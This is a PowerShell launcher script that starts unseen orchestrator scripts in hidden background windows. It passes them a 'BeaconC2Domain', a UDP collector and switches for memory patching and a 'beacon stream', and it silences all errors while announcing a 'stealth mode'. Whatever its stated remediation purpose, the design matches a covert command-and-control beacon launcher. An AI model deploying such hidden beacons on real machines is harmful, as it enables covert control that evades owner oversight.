#Requires -Version 7.2
<#
.SYNOPSIS
    SovereignOneClick.ps1 - Single-command activation of full Beaconism stack

.DESCRIPTION
    Spins up the SovereignSwarmOrchestrator in a detached background terminal
    sequence, initializing system telemetry while keeping ports dark.
    Replaces HTTP gateway initialization with pure beaconism deployment.

.NOTES
    Version: 1.2.0
    Status: ACTIVE_STEALTH_MODE
#>

[CmdletBinding()]
param (
    [string]$NodeIdentifier = "node-alpha-01",
    [string]$BeaconC2Domain = "recovery.internal.local",
    [string]$UdpCollectorHost = "127.0.0.1",
    [int]$UdpCollectorPort = 9999,
    [switch]$FullRemediation,      # Enable disk + memory + beacon
    [switch]$BeaconOnly,          # Just start beacon stream
    [switch]$ShowConsole          # Don't hide the window
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

Write-Output "[ONECLICK] Sovereign One-Click Deployment"
Write-Output "[ONECLICK] Node: $NodeIdentifier"

# ============================================================================
# Resolve module paths
# ============================================================================
$ModuleDir = $PSScriptRoot
$Orchestrator = Join-Path $ModuleDir "SovereignUnifiedOrchestrator.ps1"
$SwarmOrchestrator = Join-Path $ModuleDir "SovereignSwarmOrchestrator.ps1"

# ============================================================================
# Determine execution mode
# ============================================================================
$WindowStyle = if ($ShowConsole) { "Normal" } else { "Hidden" }

if ($FullRemediation) {
    Write-Output "[ONECLICK] Mode: FULL REMEDIATION (disk + memory + beacon)"

    if (Test-Path $Orchestrator) {
        $Args = @(
            "-File", $Orchestrator,
            "-NodeIdentifier", $NodeIdentifier,
            "-BeaconC2Domain", $BeaconC2Domain,
            "-UdpCollectorHost", $UdpCollectorHost,
            "-UdpCollectorPort", $UdpCollectorPort,
            "-EnableDiskRemediation",
            "-EnableMemoryPatch",
            "-EnableBeaconStream",
            "-Daemon",
            "-EnableEventLogFallback"
        )

        Start-Process -FilePath "pwsh.exe" -ArgumentList $Args -WindowStyle $WindowStyle
        Write-Output "[ONECLICK] Full remediation orchestrator launched in background"
    } else {
        Write-Output "[ONECLICK] ERROR: Orchestrator not found at $Orchestrator"
    }
} elseif ($BeaconOnly) {
    Write-Output "[ONECLICK] Mode: BEACON ONLY"

    if (Test-Path $SwarmOrchestrator) {
        $Args = @(
            "-File", $SwarmOrchestrator,
            "-NodeIdentifier", $NodeIdentifier,
            "-BeaconC2Domain", $BeaconC2Domain,
            "-UdpCollectorHost", $UdpCollectorHost,
            "-UdpCollectorPort", $UdpCollectorPort,
            "-Daemon",
            "-EnableEventLogFallback"
        )

        Start-Process -FilePath "pwsh.exe" -ArgumentList $Args -WindowStyle $WindowStyle
        Write-Output "[ONECLICK] Swarm orchestrator launched in background"
    } else {
        Write-Output "[ONECLICK] ERROR: Swarm orchestrator not found at $SwarmOrchestrator"
    }
} else {
    Write-Output "[ONECLICK] Usage:"
    Write-Output "  -FullRemediation  : Disk patch + memory patch + beacon stream"
    Write-Output "  -BeaconOnly       : Just start the beacon telemetry stream"
    Write-Output "  -ShowConsole      : Show the PowerShell window (default: hidden)"
}

Write-Output "[ONECLICK] Deployment initiated. Node is now in PORT_LESS_STEALTH mode."
